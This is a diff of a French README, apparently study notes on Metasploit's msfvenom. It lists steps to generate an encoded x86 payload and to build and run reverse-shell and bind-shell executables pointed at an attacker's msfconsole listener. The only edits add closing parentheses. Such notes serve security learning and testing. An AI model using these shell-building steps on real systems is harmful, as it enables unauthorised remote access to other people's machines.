@@ -23,12 +23,12 @@ Création du payload : msfvenom -e x86/shikata_ga_nai -f c -a x86 -o asm01_x86.s
 
 # Msfvenom - création de l'executable pour reverseshell
 
-Création de l'executable : ./revshell_x86.sh <IP_ECOUTE> <PORT_ECOUTE> (ou IP_ECOUTE et PORT_ECOUTE sont les informations renseignées en option du listener msf
+Création de l'executable : ./revshell_x86.sh <IP_ECOUTE> <PORT_ECOUTE> (ou IP_ECOUTE et PORT_ECOUTE sont les informations renseignées en option du listener msf )
 
 Execution : chmod +x revshell_x86.elf && ./revshell_x86.elf (une fois que l'écoute dans la msfconsole de l'attaquant est lancée)
 
 # Msfvenom - création de l'executable pour bindshell
 
-Création de l'exécutable : ./bindshell_x86.sh <IP_CIBLE> <PORT_ECOUTE> (ou IP_CIBLE et PORT_ECOUTE sont les informations renseignées en option du listener msf
+Création de l'exécutable : ./bindshell_x86.sh <IP_CIBLE> <PORT_ECOUTE> (ou IP_CIBLE et PORT_ECOUTE sont les informations renseignées en option du listener msf )
 
 Execution : chmod +x bindshell_x86.elf && ./bindshell_x86.elf (une fois que l'écoute dans la msfconsole de l'attaquant est lancée)
